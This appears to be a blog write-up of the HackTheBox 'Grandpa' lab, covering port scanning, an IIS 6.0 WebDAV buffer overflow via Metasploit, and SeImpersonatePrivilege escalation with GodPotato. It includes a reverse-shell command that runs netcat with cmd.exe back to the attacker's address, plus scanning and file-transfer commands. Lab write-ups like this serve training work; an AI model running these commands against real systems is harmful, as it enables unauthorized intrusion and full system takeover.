---
title: "Grandpa HackTheBox" 
date: 2025-07-25 06:00:00 0000+
tags: [WriteUp, Grandpa, HTB, Enumeration, BufferOverflow, CVE, GodPotato, Privilege Escalation, Windows]
categories: [WriteUps, HackTheBox]
image:
  path: /assets/images/Grandpa_HTB/preview_grandpa.png
---
# Grandpa HTB Writeup

Grandpa is an easy level windows machine which focuses on the a Buffer Overflow CVE, by exploiting this we get a shell on the box now enumerating further gives us that the **SeImpersonatePrivilege** is enabled on the box helping us upload godpotato.exe giving us Administrator shell.

![image.png](/assets/images/Grandpa_HTB/image.png)

## Initial Enumeration

Using rustscan to find open ports and services.

```bash
rustscan -a 10.129.95.233 --range 1-65535
```

![image.png](/assets/images/Grandpa_HTB/image%201.png)

Ran NMAP to find more verbose results.

```bash
nmap -sC -sV -vv -p 80 10.129.95.233
```

![image.png](/assets/images/Grandpa_HTB/image%202.png)

### Web Enumeration

Looking at the webpage on port 80, we have this.

![image.png](/assets/images/Grandpa_HTB/image%203.png)

It says site under construction.

Lets try with directory busting using feroxbuster.

```bash
feroxbuster -u http://10.129.95.233/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
```

![image.png](/assets/images/Grandpa_HTB/image%204.png)

But nothing useful found with the directory busting.

## Exploitation

I found the version of the IIS server is 6.0 using wappylyzer a web extension.

![image.png](/assets/images/Grandpa_HTB/image%205.png)

Used Searchsploit to find exploits against the IIS 6.0.

```bash
searchsploit iis 6.0
```

![image.png](/assets/images/Grandpa_HTB/image%206.png)

Lets go with the **WebDAV ScStoragePathFromUrl Remote Buffer Overflow.**

### Metasploit Exploitation

Searched in the METASPLOIT FRAMEWORK for the exploits and found these results.

![image.png](/assets/images/Grandpa_HTB/image%207.png)

Lets go with the 25th exploit.

![image.png](/assets/images/Grandpa_HTB/image%208.png)

Lets configure this exploit for our use.

![image.png](/assets/images/Grandpa_HTB/image%209.png)

After configuring the exploit we gave **exploit** to run the exploit.

![image.png](/assets/images/Grandpa_HTB/image%2010.png)

And we have shell.

I type shell to get a proper windows shell exiting our meterpreter shell.

![image.png](/assets/images/Grandpa_HTB/image%2011.png)

Now lets just focus on privilege escalation.

There is no user on the box only a network service through which we have a shell.

## Privilege Escalation

Now lets use the exploit suggester module of windows to find the suitable exploit for us.

![image.png](/assets/images/Grandpa_HTB/image%2012.png)

Going to use the 4th exploit from the above list.

![image.png](/assets/images/Grandpa_HTB/image%2013.png)

Lets configure the exploit.

here our session opened is 1.

So lets just background our session and feed the exploit suggester our session 1.

![image.png](/assets/images/Grandpa_HTB/image%2014.png)

Configuring it.

But the exploit failed to get me a privileged shell.

Enumerated the box more and found that the **SeImpersonatePrivilege** is enabled on the box.

![image.png](/assets/images/Grandpa_HTB/image%2015.png)

So lets just upload godpotato.exe 

So I started a SMB Share on my local machine using impacket’s smbshare.py.

```bash
impacket-smbshare share .
```

![image.png](/assets/images/Grandpa_HTB/image%2016.png)

![image.png](/assets/images/Grandpa_HTB/image%2017.png)

Copied the file to the C:\windows\temp directory.

Also copied the nc64.exe binary to get the privileged NT AUTHORITY/SYSTEM shell on our box.

![image.png](/assets/images/Grandpa_HTB/image%2018.png)

Started a listener on our local machine on port 9099.

```bash
nc -lnvp 9099
```

Running the exploit

```powershell
.\gp.exe -d "c:\windows\temp\nc.exe -e cmd.exe 10.10.14.13 9099"
```

![image.png](/assets/images/Grandpa_HTB/image%2019.png)

And we have a shell, now lets grab both our administrator and user flags.

![image.png](/assets/images/Grandpa_HTB/image%2020.png)

Submitting our both the flags.

Rooted!

![image.png](/assets/images/Grandpa_HTB/image%2021.png)

Thanks for reading 😊
